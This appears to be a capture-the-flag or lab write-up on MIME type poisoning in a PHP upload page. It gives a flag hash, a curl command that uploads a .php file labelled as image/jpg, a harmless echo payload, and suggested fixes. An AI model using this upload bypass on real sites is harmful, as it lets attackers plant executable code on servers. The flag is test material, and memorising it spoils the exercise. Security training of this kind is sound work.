# MIME Type Poisoning

## Flag

46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

## Description

This page is vulnerable to MIME type poisoning, allowing us to inject some .php payload by forcing them to be detected as image/jpg files.

## URL

http://192.168.x.y/index.php?page=upload

## Steps To Reproduce

curl -F "Upload=Upload" -F "uploaded=@badpayload.php;type=image/jpg" "192.168.56.101/?page=upload#"

## Why is it dangerous ?

If there is some gallery pages, you can execute your injected scripts by clicking them.

## Possible fixes

- Verify file extention (No null byte in php7, file can be corrupted or a .php renamed in .jpg, but the browser will not execute it and the issue will not be exploitable)
- Additionaly, manually parse file headers depending on their extention, some libraries make this simple, a good point is that it avoids corrupted images as well.

## Resources

```php
#badpayload.php

<?php

echo "You've been hacked";
```
